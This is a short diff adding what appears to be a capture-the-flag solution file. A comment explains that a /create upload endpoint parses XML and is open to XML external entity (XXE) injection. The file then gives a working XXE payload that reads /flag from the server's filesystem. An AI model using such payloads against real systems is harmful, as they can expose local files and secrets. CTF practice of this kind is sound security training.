@@ -1,0 +1,16 @@
+<!-- 
+    there is an endpoint called /create it have an upload form 
+    it accepts xml files.
+    there is a vulnerability called XXE stands for (XML external entity)
+    we inject this payload in the file and upload it 
+    and we get the flag
+    NOTE: we know that the flag is in /flag from the Dockerfile 
+
+ -->
+
+<!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///flag">]>
+<root>
+    <foo>
+        &xxe;
+    </foo>
+</root>
